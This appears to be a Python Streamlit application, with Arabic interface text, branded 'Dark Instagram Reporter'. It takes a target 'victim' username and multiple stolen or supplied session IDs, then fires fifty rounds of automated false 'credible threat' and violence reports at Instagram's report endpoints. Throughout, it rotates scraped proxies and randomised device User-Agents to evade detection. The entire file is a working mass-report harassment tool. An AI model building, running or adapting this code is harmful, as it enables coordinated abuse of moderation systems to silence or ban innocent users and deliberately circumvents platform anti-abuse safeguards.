import os
import requests
import webbrowser
import time
import random
import streamlit as st
from typing import Any

# محاولة استيراد المكتبات الأصلية
try:
    import instaloader
except:
    os.system('pip install instaloader')
    import instaloader

# --- مصفوفة المعلومات الضخمة (إضافة 50 دولة و 50 جهاز) ---
COUNTRIES_LIST = ["US", "GB", "DE", "FR", "JP", "KR", "BR", "IN", "RU", "CA", "AU", "SA", "AE", "EG", "TR", "IT", "ES", "NL", "MX", "ID", "MY", "SG", "TH", "VN", "PH", "PK", "BD", "ZA", "NG", "AR", "CO", "CL", "PE", "DZ", "MA", "TN", "LY", "IQ", "JO", "KW", "QA", "OM", "BH", "SE", "NO", "FI", "DK", "PL", "CZ", "HU"]

# قائمة 50 User-Agent لأجهزة مختلفة
DEVICES_LIST = [
    f"Mozilla/5.0 (Linux; Android {random.randint(9,14)}; SM-G{random.randint(100,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,125)}.0.0.0 Mobile Safari/537.36" 
    for _ in range(50)
]

# --- الكود الأصلي الخاص بك (بدون حذف حرف واحد) ---
class sin:
    def __init__(self):
        self.g=0
        # إضافة ميزة جلب بروكسيات تلقائية داخل الـ init
        try:
            proxy_res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
            self.proxies_pool = proxy_res.text.splitlines()
        except:
            self.proxies_pool = []

    def exit_csr(self)->any:
        api=requests.get('https://www.instagram.com').cookies.get('csrftoken')
        return api

    def user_for_id(self,user_id :str,)->any:
        B = instaloader.Instaloader()
        username = user_id
        profile = instaloader.Profile.from_username(B.context, username)
        return profile.userid

    def Send_Report(self,Sessionid:str,crf_tt:str,USER_E:str,)->any:
        try:
            # اختيار بروكسي وجهاز ودولة بشكل عشوائي لكل محاولة
            current_proxy = random.choice(self.proxies_pool) if self.proxies_pool else None
            proxies = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"} if current_proxy else None
            current_ua = random.choice(DEVICES_LIST)
            current_country = random.choice(COUNTRIES_LIST)

            url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
            # الـ Payload الأصلي الخاص بك كاملاً بدون حذف أي حرف
            payload = {
              'container_module': "profilePage",
              'entry_point': "1",
              'location': "2",
              'object_id': f"{USER_E!r}",
              'object_type': "5",
              'context': "{\"tags\":[\"ig_report_account\",\"ig_its_inappropriate\",\"violence_hate_or_exploitation\"],\"ixt_context_from_www\":\"QVFZWlRaZldlWnlJVlRtRklPMmRrNEoyd1p5WWVVRG9jblN3Slhra2JXY210QmJPQXU2YnNEcG16SHpVaFJhZXVKcVN2eU9GS25ZR3Q0a3dfWDE0ODRjeXpLWlZrb1ZQaHd0dDYwQklWMjVUcTNua05FdldGY1A1Nk5SUE9YYXM2SXhiVnh1WlJROTdBS3ZWdzRDQzREdkt5R2dsOFNoamRpekphdmZfQUJKVlFhYktzbERuQmN3S2dxUkxBVHQ3MnhsVDZqZ19kY1poTHJjT1F2N0hFMkE0dl9lQ3hINkl0aGVrU0RuNEdDbGtIamR1SGhwRm93ZnpxOXNxTVZMYUpZTGFVR0FnNEk2VnFjUGRJZGVjSklfOHl6azRsb1ZfNUhxa2lGWVlMaE5SdG9ZQzYtVjFhS05Wd2JVMkNvem5QMmVuT0JnUjdzblFJTEY0OEl0dzhaXzdsaXFXWlJoTDBiNDdfNHRxYS1iOUtjd3BQTjByZjMzcDRqZ0VIZkdZV2hjVXJmYVlLc21RQXJJWmFKOWtoRE9WZ2Y2LWJpUEt3T1BrdTU2YUZoUjV5bFBLWnJPQXBSQTlvdVdEcUJ3UmtzVkd3ZHJNcVdWUHJ5bGx4WWtzMm82ZlJOWWlRcl9WeHZBREpDRUxVamZnTkhEdEFjN0lzOFFLZlkzTGVkOHpXN1dBTXB1UkZhd09LcFZaSjNMQUpKZi13RmNLNXU3ajFrNi1DdHg3ZUVqUi1VTzQ0YXUtcHFySGM4VGRkaEtFdXh5cjhsUC1pb0s3SVhaWFBUd3lleFBQajlLcC1FWUNfanMwTjdKMkc5VWxsV2dzZ2UxZ3VaT0VXaGc3UklVUjN0Y2tldGhSTUR2X0xvd2FJewNDMHFmbWhEZmhubGpRejFsLTVhYTAyREhVYnpvX2ltNUllRTJBVXJ0eWpGVHdtTWxwS2l3ek51VEFHV2tPbVdxME56WHBMajVwa1hDRldBeGpoTUVDUU5BZmszR2o2NmVKeVBwakp5Q1FsUzEwUkFsUjc0YmRSSEpLTzN6MHNFMFMwTFNxQUVHZU5nZ1ZNbDJKZVJWU2hpRjVlX3NYb2NLdDVVTVJ4RDdVU25nelBxTXF4XzZNa3c1cnlPMVk5MDBNYmU4dmEtdTBLU1NqR3dBMkl6YXp4MFdRaHdEN0pfMG5HOG1VTG1CMWhmT2RUbUJlRllYbWhfTUZhTlFWU0ZObHpBMEpSaDBVT29veEg5bVFBOWJPRXVickd4Nl8tYmZwem5EZWZLNUxFX1V2djlGdlF0aE5BSFZHTHJqbmFoUEpfMThwdndqUTRRV3BuQnBNdFJ3NDdTaEU1YktzVEl3THQ2eVVXMWpHWFBTQUo5LUxvcV9lVmVqU3FZdDdkY0owaVgyNlo3SVhjOExiOWh6VWQyNlJMQXZFZ3daZTNBd3NoN2lYRlRYclVIUV9iQ0E2NUZIZVZHV0RJNHNyRHZzVi1NTDBtWUkxSUxLNVpVNE4ySURXOV9HaHVlaDhhbDZBMnIzN3BRdU5TSEtYRkpQNnZoU0J3U0xuTUNhbDZQVmpEZVBRc1RjT2hfRGJubWZmWXhGeWRRLXB2VVRkdW5yOWxJelFzeHh3cldnd2hvNk5VTjRrc0Rpa0p1R0xvQkpmd0t6dHRJWnZIZkNsQmQ3ZjZrcmVyZk53VHRPSk9kR0RFcWUta1QydmRBOTlRUl9QNVhsdXptdzJSeW40bko3N1NVMm5aQ1dJa3BTNUoyNFhOU0x1TmRJTjlMSXdYSWNISDB2WHBNOWNId0Zqd1Fhc2pJbXY1RWwyQ08wYXhvV1BIMW9MNGlZdzlBenZCT2pZT29zR19oOUU2eDg2VXBlbWJJNXhTUjRjeDhEZU1kNGxaMXkzMkNnWXZHZmVCQzVIR1lwczJGRnJLOFJRUnJhV2k3UVZnMi1uUl9tTVo4V0ZlQkowdkZqaFlqSWN3cndUd20wTjhwd0IwUXkwd1RkbVVRZzZSbkdrWjFUdktBeFlaVFhwM0Nud0dENmdDZFpVdE9OOHJlWjE1WGhoYkp5NjQ4Mi1sbE1mcWloUU84UzE5VnBkekNrbFBuNWFkU1MyejducmFGRUhnOUdPcm9EYWNxSGU2WmdULWMxSmo2QXdFdlV1OGpTU2YtZ1U3YTF5VlpWZlhaRTFjVGRuYnI2WUEyX0xCckYzWFdZejNvWEx1SkpXRWZQTEpFVVBJNjBMUmtvdzZrMWdBRUNxd1RNa0liWHV6R3paZHZmbVlAzUohmTI3ejJZQjE5ODFkNmI2ZWtPY3pZT200R1E1Z3pBZTFJcHBLQ3Z4X2NZSHBzUkVnUWFLSm9iQ2tpUG9SZWVvMzhtZ2pjdElycThkLW9hczdYeGZZQVc4MHhCcld1M3ZmQmNOQ01rWlZkT2ZfTzRCVEU3ck5hVG12c2QySWFRLUNwemlqWUc2LTk1WXJMWWd4bkliUmNObHJOOXF1bXZfWEkzSWpPenhpRVNnbFA2NEVxcVJiam5hdGlqbV8xSkpsNmVhSGFMTzVuLVZ3bDQxdURQY2lvTWJUbDNrUWhtMFlOMDZWNjNnVTJMUXhvME9BTVFCeUstSjVPWDkwQXR2dGhrN0Radlp2dFB5eVhDYmNoaGIxVUdDeU5rdW1PM1BlSVBtcHZmd2NPM0pMMDE1ZzZGNTgyTEJHamlJdndDWEJLaXh0Vi1xRkNpWndkRy1rRXpoX1Zwc1R6TmpIbHYxLXNJc2d3QmJhRmwxM2d3dlNqSExvVnBDeFRFM0Y4X2NqZHgtdS1WaGNGNlF2ZkYtMzBlTWtOdDI2TVkyWVpyV0tZb1RUOEhnZXZob2I2Yk95MFhEWU1FcTVSNWt4SE55em00ZXlsU1FHVkxEODhGbDd0WU0xN3c3TTRVbTM0YkRieHEtUmg5aFFDdDBHOWhBUVhnQnFyZXZzdXRoLU02eElHak5PQXRqSmhDOGJfY2U0V3ZQeVRrXzVWMWdyWmhZX1BtWk1TdFZDdHpUSmFlRVdHd1o3ZmZwS0doenlfcVFrVGVJcFVTdDdfcmhuRENUTEs0eDJMVlF3V25fN1BjZ0tzMFBnVnRydWN0RWFYQlRTMzM3ZFEyWmhuUGU3VlhxZHRIbGtKM1E3ZXBpOXZlaUdBemgtOHdjTTV1UGJ4eWt0aWJUWFZJR2U5aGI2TkZNUEdvWUlFcmNvbFpoV2Rpakp2ay1OQl9TUTBSMEY0VFY4am9WT1oxd2d3ckFUbmIzMkhVTW1JbHBTbUt4elE1TmJpVDRfNVp4d0VTbmNabVBlem5VVWRIUlYwUmhicDdXSDI2dTVVdGZjNUFweVpYVHJYVGcwcHBJVlNKMTRLSkZ0cG05NlVKaE10MzRkU0JZUXU3cFURxRmx5THV2NW14UW9IUTVya2VxRG8weF9vOTNyd2UyT054UktjZkRVTXhBMGpOMlA3NTVUdk5UeTB6WkJKNGlLem12NmhHX3FheVl2TU1jZGJ4aENYcFlPMlRBS2VJSjE1aTVFaVVnZUU5Sk1qaEdUSmZjaUpTZ0hkLVlZWHB1NW9zcV9jTGw4UExaU0t5UDJKRTR4ZkVCZl8wZHBsT29ocE5FNVFhaGV4bWVsYWVYVnB6UGhXTDVFZkFmOUtTdHo3bGxCZEJIR0w2Y3RTdEFYOVRhLXdnM1Q3a1RmSXhpT2NWUnBRVWxKSDRobGpzdkNuQ2pyOGFQRFZVTjFTVjFY0X_5SVY1Rl_zR1VtMnJGQlZvblpGWDdicEFJem91ZTlaczBURUxKZXlqSzlpX3ByQmdRb0t4c09Ld0ZXR215Qm4yeUpqd0xxeFdNSHQ4ZWM3SWY2V29Nb1Z4aWp0ODMxTW5LaDVfcjFEcjlXMnRrZXhOMnExbVFpalYzSDk2ZnVJREJGT2dhaW9DXzFBdUF2TGJQZlI3dWpSaGYxX09wQXJnaFNpU21xcGp5ZDc3UHgtZmswak9VdUhkMzhsdV93TG1ZSmtCZE5GZTQwMnF3REhJLW1pRWRjRC1SRHJCSm9SRFB3TTFnYnA4OGt5YndHdWZRUmQyN0ZyUjZpV0c5RDVzTUgybUYwcDZBd2pCejhsQ0JTMEtNY25SWWYwdGlWQ0QwUFhndXlsZ0RacWFaQUVqZUw3ZkI3UnVyYm8yakZfbURTellEd2M1VWc1OUdKbHl3OU1NUi1XaXJES1otaWk3S3VWRm94RXZZbi01ZC1vVVdKb3RUZklzaGdJZzA4QmVJSG81OUZjRHJtYU0xYjRTSVl0U21zYWpuRGI4NDJiUEFHeHBDR1ZBVXRSVlpxWHlyWU1VUnZIVmhKN2twV0hBVER5UnJ6RDdTQVFnMkNnS2tJRU9xV1JIYkIxOFFGVk1KQm5uRFM2V3BhenY1dUtjTmFFOEwtSzNxc3VDdmhSYUNTbm9BdTN2Sm5JYk1vZmRoU1FNdjhycl9Sdkx0WjZMR1ZncVBHa1JialpyeTNzb1JobzhfMEZYbVhXVHREdFliZkdBTVZXZW9DSEs0M19tMzN0MzJIZ1VBWG9zZ3gw\",\"frx_context_from_www\":\"{\\\"location\\\":\\\"ig_profile\\\",\\\"entry_point\\\":\\\"chevron_button\\\",\\\"session_id\\\":\\\"b6f2fe68-e6c2-402d-ba61-fa32742586c3\\\",\\\"tags\\\":[\\\"ig_report_account\\\",\\\"ig_its_inappropriate\\\",\\\"violence_hate_or_exploitation\\\"],\\\"object\\\":\\\"{\\\\\\\"user_id\\\\\\\":\\\\\\\""+repr(USER_E)+"\\\\\\\"}\\\",\\\"reporter_id\\\":17841477249253541,\\\"responsible_id\\\":17841402263455874,\\\"locale\\\":\\\"ar_AR\\\",\\\"app_platform\\\":1,\\\"extra_data\\\":{\\\"container_module\\\":\\\"profilePage\\\",\\\"app_version\\\":\\\"None\\\",\\\"is_dark_mode\\\":null,\\\"app_id\\\":1217981644879628,\\\"sentry_feature_map\\\":\\\"Jv7di5q+BBgNMzcuMjM2LjEwLjEwMxhvTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2GAVhcl9BUhwYIGE1OTk3Yzc1ZGE0ZmExNWUyYjZkNzFiMGQ5MDY3MWRhGCBmYzE0NTBiNTg5MDViOTVmNWU1YTM2YWRiZTAxYzRjOBggYzFlYzY5ZDc5NmMzYzU4ZDQ4MmI5OTFlNWM2ZmViZjIYIDczZjk2ZThjZmZmNzZkNjEwZjA0Njg2MDFjNTk1MDM3IRggZDUzOTZjNjZhMjM0NDBkOWYxMDQ5MjJhN2U1NGNiODAYJHQxM2QzMTExaDJfZThmMWU3ZTc4ZjcwXzVhYzcxOTdkZjlkMgA8LBgcYUp5MHV3QUJBQUdoTXpnY2hadUNSQ1dCdEJmSxbw6Y\\\\\\/ClGYAHBUCKwGIEWRpc3BsYXlfc2l6ZV90eXBlH0RldmljZVR5cGVCeURpc3BsYXlTaXplLlVOS05PV04AIjw5FQAZFQA5FQA5FQAAGCAwOWFmZmNiNzFmNGM0Mzg2ODkzZThjNzMxNDVmNjBjZBUCERIYEDEyMTc5ODE2NDQ4Nzk2MjgcFpjbm4bCsLI\\\\\\/GEAzNzQ4YTZmMmQ5NmY0OTM2YTM0ZmViZjI1MWNjMmM1YWU0MjBjNGRlMGM3ZDk2NGVkY2JjZmJhNTkwYTUzNjMyGBk3NzA2ODMzNDk3NToyMDoxNzU3MjI3NTU0ABwVBAASKChodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3NoZXJpbnNiZWF1dHkvGA5YTUxIdHRwUmVxdWVzdAAWyoKum9SusT8oIy9hcGkvdjEvd2ViL3JlcG9ydHMvZ2V0X2ZyeF9wcm9tcHQvFigWxKjpiw1YATQYBVZBTElEAA==\\\",\\\"shopping_session_id\\\":null,\\\"logging_extra\\\":null,\\\"is_in_holdout\\\":null,\\\"preloading_enabled\\\":null},\\\"frx_feedback_submitted\\\":false,\\\"ufo_key\\\":\\\"ufo-3f1f7ad1-e14d-4742-b7c5-0893703561c8\\\",\\\"additional_data\\\":{\\\"is_ixt_session\\\":true,\\\"frx_validation_ent\\\":\\\"IGEntUser\\\"},\\\"profile_search\\\":false,\\\"screen_type\\\":\\\"frx_tag_selection_screen\\\",\\\"ent_has_music\\\":false,\\\"evidence_selections\\\":[],\\\"is_full_screen\\\":false}\"}",
              'selected_tag_types': "[\"violent_hateful_or_disturbing-credible_threat\"]",
              'frx_prompt_request_type': "2",
              'jazoest': "22668"
            }
            headers = {
              'User-Agent': current_ua,
              'x-ig-app-id': "1217981644879628",
              'x-requested-with': "XMLHttpRequest",
              'x-csrftoken': crf_tt,
              'Cookie': f"csrftoken={crf_tt}; sessionid={Sessionid}"
            }
            # إرسال الطلب مع البروكسي المختار عشوائياً
            response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=10).text
            if '"status":"ok"' in response:
                self.g+=1
                return True, f" [{self.g}] تم البلاغ من {current_country} | IP: {current_proxy}"
            else:
                return False, f" [!] خطأ في الجلسة: {response[:50]}"
        except Exception as e:
            return False, f" [!] خطأ اتصال: {str(e)[:30]}"
														
    def lite_re(self,Sessionid:str,crf_tt:str,USER_E:str,)->any:
        try:
            # استخدام بيانات عشوائية أيضاً هنا
            current_proxy = random.choice(self.proxies_pool) if self.proxies_pool else None
            proxies = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"} if current_proxy else None
            
            url = f"https://i.instagram.com/users/{USER_E!r}/flag/"
            headers = {
                "User-Agent": random.choice(DEVICES_LIST),
                "Host": "i.instagram.com",
                "cookie": f"sessionid={Sessionid}",
                "X-CSRFToken":crf_tt,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            data = f"source_name=&reason_id=5&frx_context="
            r3 = requests.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=False, timeout=10).text
            return r3		
        except Exception as e:
            return str(e)

# --- إعداد واجهة Streamlit (نفس تصميمك الأصلي) ---
st.set_page_config(page_title="Dark Instagram Reporter", page_icon="gx1gx1", layout="centered")

st.markdown("""
    <style>
    #MainMenu {visibility: hidden;} header {visibility: hidden;} footer {visibility: hidden;}
    .stAppDeployButton {display:none;}
    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; text-align: center; }
    .stButton>button { background-color: #4a0000; color: white; border: 2px solid #ff0000; box-shadow: 0 0 10px #ff0000; width: 100%; border-radius: 10px; }
    .header-img { display: block; margin: auto; width: 50%; border-radius: 50%; border: 2px solid #ff0000; box-shadow: 0 0 15px #ff0000; margin-bottom: 20px; }
    </style>
    """, unsafe_allow_html=True)

st.markdown(f'<img src="https://files.catbox.moe/qte6xo.jpg" class="header-img">', unsafe_allow_html=True)
st.markdown("<h1>نظام البلاغات المظلم gx1gx1</h1>", unsafe_allow_html=True)

OO = sin()

user_id = st.text_input("أدخل يوزر الضحية (USER )", "")
count_sessions = st.number_input("كم عدد Session IDs؟", min_value=1, step=1)

session_list = []
for i in range(int(count_sessions)):
    sid = st.text_input(f"أدخل sessionid رقم {i+1}", key=f"sid_{i}", type="password")
    if sid: session_list.append(sid)

option = st.selectbox("اختر نوع البلاغ:", ["-- اختر --", "بلاغ إنستجرام", "بلاغ إنستجرام لايت"])

if st.button("بدء الـهجوم "):
    if not user_id or not session_list:
        st.error("خطأ: أدخل اليوزر والجلسة!")
    elif option == "-- اختر --":
        st.warning("الرجاء اختيار النوع.")
    else:
        try:
            with st.spinner('جاري جلب المعلومات وتفعيل نظام التخفي...'):
                crf_tt = OO.exit_csr()
                USER_E = OO.user_for_id(user_id)
            
            st.success(f"تم العثور على هدفك بنجاح: {USER_E}")
            
            if option == "بلاغ إنستجرام":
                st.markdown(f"### سجل البلاغات (تلقائي):")
                placeholder = st.empty()
                log_data = ""
                # تشغيل 50 محاولة ببيانات مختلفة لكل محاولة
                for attempt in range(50):
                    for current_sid in session_list:
                        success, result = OO.Send_Report(current_sid, crf_tt, USER_E)
                        log_data = f"المحاولة {attempt+1}: {result}\n" + log_data
                        placeholder.text_area("", value=log_data, height=350)
                        time.sleep(0.5)

            elif option == "بلاغ إنستجرام لايت":
                st.markdown(f"### سجل بلاغات لايت (تلقائي):")
                placeholder = st.empty()
                log_data = ""
                for attempt in range(50):
                    for current_sid in session_list:
                        res_lite = OO.lite_re(current_sid, crf_tt, USER_E)
                        log_data = f"المحاولة {attempt+1} [Lite]: {res_lite[:50]}\n" + log_data
                        placeholder.text_area("", value=log_data, height=350)
                        time.sleep(0.5)

        except Exception as e:
            st.error(f"حدث خطأ: {e}")
